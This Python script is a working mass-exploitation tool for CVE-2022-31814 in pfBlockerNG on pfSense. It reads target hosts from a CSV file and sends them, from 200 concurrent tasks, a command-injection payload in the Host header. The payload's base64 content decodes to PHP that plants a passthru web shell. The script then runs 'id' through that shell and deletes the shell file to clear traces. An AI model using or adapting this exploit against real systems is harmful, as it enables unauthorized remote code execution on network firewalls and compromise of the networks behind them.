import asyncio
import csv
import urllib

import httpx

from acetylate_poc.schemas.cli_args import ArgOptionDetails, CommandArgsSchema
from acetylate_poc.utils.manage import GeneralToolsBox
from acetylate_poc.utils.script import build_argparse

TIMEOUT = 12.0

def csv_file_iterator(filename):
    with open(filename, 'r', encoding="utf-8-sig") as file:
        reader = csv.DictReader(file)
        for row in reader:
            yield row

async def exploit(client: httpx.AsyncClient, target):
    host = target.get("host")
    protocol = target.get("protocol")
    ip = target.get("ip")
    domain = target.get("domain")
    port = target.get("port")

    base_url = GeneralToolsBox.fix_base_url(host, protocol, ip, domain, port)

    payloads = [
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python2 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python2 -m base64 -d | php; '"},  # noqa: E501
        {"Host": "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3.8 -m base64 -d | php; '"}  # noqa: E501
    ]

    headers = None
    result = None
    try:
        for payload in payloads:
            await asyncio.sleep(0.5)
            response = await client.post(
                f"{base_url}/pfblockerng/www/index.php",
                headers=payload, timeout=TIMEOUT
            )
            if response.status_code == 200:
                headers = payload
                break
        else:
            result = f"[-] [{response.status_code}]\t[{base_url}] No Up"

        if headers:
            await asyncio.sleep(1)
            response = await client.post(
                f"{base_url}/system_advanced_control.php?c=id",
                headers=headers, timeout=TIMEOUT
            )
            if "uid" in response.text:
                result = f"[+] [{response.status_code}]\t[{base_url}]\n{response.text}\n"
            else:
                result = f"[+] [{response.status_code}]\t[{base_url}] No Find"

            await asyncio.sleep(0.5)
            rm_cmd = "rm /usr/local/www/system_advanced_control.php"
            response = await client.post(
                f"{base_url}/system_advanced_control.php?c={urllib.parse.quote(rm_cmd, safe='')}",
                headers=headers, timeout=TIMEOUT
            )

            if response.status_code == 200:
                result += f"\n[*] [{response.status_code}]\t[{base_url}] clear all"

    except httpx.HTTPStatusError as exc:
        result = f"[-] [{exc.response.status_code}]\t[{base_url}] {exc}"
    except httpx.TimeoutException:
        result = f"[-] [Timeout]\t[{base_url}] Request timed out."
    except httpx.NetworkError as exc:
        result = f"[-] [Network Error]\t[{base_url}] {exc}"
    except Exception as exc:
        result = f"[-] [Error]\t[{base_url}] {exc}"
    finally:
        return result  # noqa: B012


async def request_task(task_name, queue):
    async with httpx.AsyncClient(verify=False) as client:  # noqa: S501
        while True:
            target = await queue.get()
            if target:
                result = await exploit(client, target)
                print(f"[{task_name}] {result}")
            queue.task_done()

@GeneralToolsBox.timeit
async def main(csv_file, queue_size=50000, task_num=200):
    queue = asyncio.Queue(queue_size)

    tasks = []
    zfill_length = len(str(task_num))
    for i in range(task_num):
        task = asyncio.create_task(request_task(f'task-{i:0{zfill_length}d}', queue))
        tasks.append(task)

    for target in csv_file_iterator(csv_file):
        queue.put_nowait(target)

        if queue.full():
            await queue.join()

    if not queue.empty():
        await queue.join()

    for task in tasks:
        task.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == '__main__':

    args = build_argparse(CommandArgsSchema(
        description=(
            "CVE-2022-31814"
        ),
        required=["file"],
        options={
            "file": ArgOptionDetails(
                short_name="f",
                arg_type="str",
                arg_help="csv file"
            )
        }
    )).parse_args()
    if args.file:
        asyncio.run(main(args.file))